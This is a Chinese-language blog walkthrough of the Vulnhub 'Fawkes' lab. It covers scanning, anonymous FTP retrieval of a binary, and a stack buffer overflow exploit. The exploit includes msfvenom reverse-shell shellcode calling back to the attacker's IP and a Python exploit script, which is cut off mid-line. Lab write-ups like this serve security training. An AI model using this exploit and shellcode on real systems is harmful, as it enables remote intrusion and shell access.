@@ -1,0 +1,316 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Fawkes | YiFang</title><meta name="keywords" content="Vulnhub-Hard"><meta name="author" content="YiFang"><meta name="copyright" content="YiFang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Vulnhub Fawkes靶机打靶过程靶机详解1.难度高级 2.环境kali Linux 2021 192.168.0.101 Linux  192.168.0.100 3.应用技术攻击开始1.主机发现依旧是使用 arp-scan进行主机发现 123456➜  ~ sudo arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:06:73">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fawkes">
+<meta property="og:url" content="http://example.com/2022/01/17/fawkes/index/index.html">
+<meta property="og:site_name" content="YiFang">
+<meta property="og:description" content="Vulnhub Fawkes靶机打靶过程靶机详解1.难度高级 2.环境kali Linux 2021 192.168.0.101 Linux  192.168.0.100 3.应用技术攻击开始1.主机发现依旧是使用 arp-scan进行主机发现 123456➜  ~ sudo arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:06:73">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161016302.jpg">
+<meta property="article:published_time" content="2022-01-17T02:47:27.392Z">
+<meta property="article:modified_time" content="2022-01-16T06:03:23.501Z">
+<meta property="article:author" content="YiFang">
+<meta property="article:tag" content="Vulnhub-Hard">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161016302.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/01/17/fawkes/index/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Fawkes',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-16 14:03:23'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201112100412.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161016302.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">YiFang</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Fawkes</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-17T02:47:27.392Z" title="发表于 2022-01-17 10:47:27">2022-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-16T06:03:23.501Z" title="更新于 2022-01-16 14:03:23">2022-01-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Vulnhub/">Vulnhub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Fawkes"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Vulnhub-Fawkes靶机打靶过程"><a href="#Vulnhub-Fawkes靶机打靶过程" class="headerlink" title="Vulnhub Fawkes靶机打靶过程"></a>Vulnhub Fawkes靶机打靶过程</h1><h2 id="靶机详解"><a href="#靶机详解" class="headerlink" title="靶机详解"></a>靶机详解</h2><h3 id="1-难度"><a href="#1-难度" class="headerlink" title="1.难度"></a>1.难度</h3><p>高级</p>
+<h3 id="2-环境"><a href="#2-环境" class="headerlink" title="2.环境"></a>2.环境</h3><p><em>kali Linux 2021 192.168.0.101</em></p>
+<p><em>Linux  192.168.0.100</em></p>
+<h3 id="3-应用技术"><a href="#3-应用技术" class="headerlink" title="3.应用技术"></a>3.应用技术</h3><h2 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>依旧是使用 <code>arp-scan</code>进行主机发现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.101</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.100	08:00:27:9a:16:bb	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><p>使用 <code>nmap</code>进行端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sC -sV -p- 192.168.0.100</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-15 21:19 EST</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.00078s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">21/tcp   open  ftp        vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.0.101</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)</span><br><span class="line">|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)</span><br><span class="line">|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">2222/tcp open  ssh        OpenSSH 8.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c4:1d:d5:66:85:24:57:4a:86:4e:d9:b6:00:69:78:8d (RSA)</span><br><span class="line">|   256 0b:31:e7:67:26:c6:4d:12:bf:2a:85:31:bf:21:31:1d (ECDSA)</span><br><span class="line">|_  256 9b:f4:bd:71:fa:16:de:d5:89:ac:69:8d:1e:93:e5:8a (ED25519)</span><br><span class="line">9898/tcp open  tcpwrapped</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds</span><br></pre></td></tr></table></figure>
+
+<p>打开了<code>21</code>（FTP） <code>22</code>（ssh） <code>80</code>（web）<code>2222</code>（ssh） <code>9898</code>（不知道什么服务）[网上说是防火墙服务]</p>
+<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3.信息收集"></a>3.信息收集</h3><p><code>21</code>端口是允许匿名登录的，账号<code>anonymous</code> 密码 <code>anonymous</code></p>
+<p>访问后有一个 <code>server_hougwarts</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Connected to 192.168.0.100.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.0.100:yifang): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get server_hogwarts</span></span><br><span class="line">local: server_hogwarts remote: server_hogwarts</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">705996 bytes received in 0.02 secs (34.7111 MB/s)</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>ftp</code>命令<code>get</code>对文件进行下载，然后继续查看ftp目录是否能够写入文件或者目录穿越，显然并没有…..</p>
+<p>然后这个 <code>server_hogwarts</code>是个二进制文件，在执行后打开了一个端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps -e | grep server_ </span><br><span class="line">   2511 pts/2    00:00:00 server_hogwarts</span><br><span class="line">➜  ~ netstat -anp | grep server</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">tcp        0      0 0.0.0.0:9898            0.0.0.0:*               LISTEN      2511/./server_hogwa </span><br></pre></td></tr></table></figure>
+
+<p>对于这种情况，可以使用<code>nc</code> 进行调试，进而查看他到底开了什么服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc 127.0.0.1 9898</span><br><span class="line">Welcome to Hogwart&#x27;s magic portal</span><br><span class="line">Tell your spell and ELDER WAND will perform the magic</span><br><span class="line"></span><br><span class="line">Here is list of some common spells:</span><br><span class="line">1. Wingardium Leviosa(悬浮咒)</span><br><span class="line">2. Lumos (荧光闪烁)</span><br><span class="line">3. Expelliarmus(除你武器)</span><br><span class="line">4. Alohomora(开锁咒)</span><br><span class="line">5. Avada Kedavra (阿瓦达索命)</span><br><span class="line"></span><br><span class="line">Enter your spell: avada kedavra</span><br><span class="line">Magic Output: This spell is black magic and is forbidden in hogwarts</span><br><span class="line"></span><br><span class="line">Enter your spell: </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161052159.jpg"></p>
+<p>这里打开了<code>9898</code>端口，稍加思索就能想明白，这里的<code>9898</code>与之前的<code>nmap</code>扫描结果是有极大概率跑的是一个服务！</p>
+<p>尝试nc连接目标服务，果然！（那么就有可能去pwn掉他！）</p>
+<p><code>80</code>端口是web服务，但是对其进行一系列扫描，文件发现之后，并没有任何文件，只有一个起始目录。。。</p>
+<h3 id="3-堆栈溢出"><a href="#3-堆栈溢出" class="headerlink" title="3.堆栈溢出"></a>3.堆栈溢出</h3><p>在进行堆栈溢出之前有一步操作，就是关闭<code>kali</code>的<code>alsr</code>[内存地址随机]技术，详细原因看以上文章！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s (只有root才有权限操作)</span><br><span class="line">echo 0 &gt; /prco/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p>安装 <code>edb-debugger</code>动态调试工具，进行动态调试</p>
+<p><code>edb</code>是个图形化的调试工具，相比于<code>gdb</code>的交互界面要更为友好一些，具体使用方法的可以参考网上的其他文章，这里不作赘述</p>
+<hr>
+<p>准备工作完了以后，现在就开始进行动态调试了</p>
+<p>现在<code>kali</code>上运行<code>edb</code> 以及 <code>server_hogwarts</code>，然后在edb中[file]-&gt;[attach]然后进行筛选关键字，找到 <code>server_Hogwarts</code>的进程，选中后，点击[debug]-&gt;[run]</p>
+<p>这时候就可以使用nc对其进行连接，然后使用python输出500个字母</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print(&#x27;A&#x27;*500)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将这500个a注入到nc中，结果<code>edb</code>直接弹出有溢出错误，可以看到的是，全部溢出成了414141，41是A的ascii编码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161143262.jpg"></p>
+<p>使用msf的模块，生成一500个不重复的字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msf-pattern_create -l 500 </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span><br></pre></td></tr></table></figure>
+
+<p>然后将其注入到nc中再次尝试！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161143813.jpg"></p>
+<p>成功让程序溢出，现在得到了一串字符<code>64413764</code>，需要对比前面的500个字符，获得溢出的偏移量，当然肉眼是无法完成的，依然是msf的小工具</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msf-pattern_offset -l 500 -q 64413764</span><br><span class="line">[*] Exact match at offset 112</span><br></pre></td></tr></table></figure>
+
+<p>偏移量是112</p>
+<p>再次进行确认</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;A&quot;*112+&#x27;B&#x27;*4+&#x27;C&#x27;*20</span><br></pre></td></tr></table></figure>
+
+<p>使用生成的字符串进行测试，果然，溢出的字符变成了424242（B的ascii编码）</p>
+<p>思路：在寄存器中，EIP负责下一步要执行代码，ESP存储代码，那么很简单，在之前的测试中得知，我们可以溢出EIP和ESP，那么只需要在EIP中做一个跳到ESP寄存器指令就行，而ESP中则溢出我们要执行的命令即可！</p>
+<p>在edb中的插件选项中，有可以进行搜索汇编代码的地方，<code>opsearch</code>插件，寻找ESP-&gt;EIP，注意！这里必须要有可执行的进程才行，否则无法得到反弹shell的目的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161207254.jpg"></p>
+<p><code>jump ESP</code>的内存地址在<code>0x08049d55</code></p>
+<p>然后用msfvenom进行Linux反弹shell的生成</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.101 LPORT=4444 -b &quot;\x00&quot; -f py</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 95 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 95</span><br><span class="line">Payload size: 95 bytes</span><br><span class="line">Final size of py file: 479 bytes</span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\xbf\x8a\xae\xbb\x8a\xda\xca\xd9\x74\x24\xf4\x58\x29&quot;</span><br><span class="line">buf += b&quot;\xc9\xb1\x12\x31\x78\x12\x03\x78\x12\x83\x4a\xaa\x59&quot;</span><br><span class="line">buf += b&quot;\x7f\x7b\x68\x6a\x63\x28\xcd\xc6\x0e\xcc\x58\x09\x7e&quot;</span><br><span class="line">buf += b&quot;\xb6\x97\x4a\xec\x6f\x98\x74\xde\x0f\x91\xf3\x19\x67&quot;</span><br><span class="line">buf += b&quot;\xe2\xac\xda\x12\x8a\xae\xda\xcd\x16\x26\x3b\x5d\xc0&quot;</span><br><span class="line">buf += b&quot;\x68\xed\xce\xbe\x8a\x84\x11\x0d\x0c\xc4\xb9\xe0\x22&quot;</span><br><span class="line">buf += b&quot;\x9a\x51\x95\x13\x73\xc3\x0c\xe5\x68\x51\x9c\x7c\x8f&quot;</span><br><span class="line">buf += b&quot;\xe5\x29\xb2\xd0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后开始编写python代码生成exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> socket,sys</span><br><span class="line"><span class="comment">#EIP = &#x27;\x55\x9d\x04\x08&#x27;#内存由低到高读取，需要反着写！</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\x8a\xae\xbb\x8a\xda\xca\xd9\x74\x24\xf4\x58\x29&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x78\x12\x03\x78\x12\x83\x4a\xaa\x59&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7f\x7b\x68\x6a\x63\x28\xcd\xc6\x0e\xcc\x58\x09\x7e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xb6\x97\x4a\xec\x6f\x98\x74\xde\x0f\x91\xf3\x19\x67&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe2\xac\xda\x12\x8a\xae\xda\xcd\x16\x26\x3b\x5d\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x68\xed\xce\xbe\x8a\x84\x11\x0d\x0c\xc4\xb9\xe0\x22&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x9a\x51\x95\x13\x73\xc3\x0c\xe5\x68\x51\x9c\x7c\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe5\x29\xb2\xd0&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+ <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>+buf</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;192.168.0.100&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">s.send((payload))</span><br><span 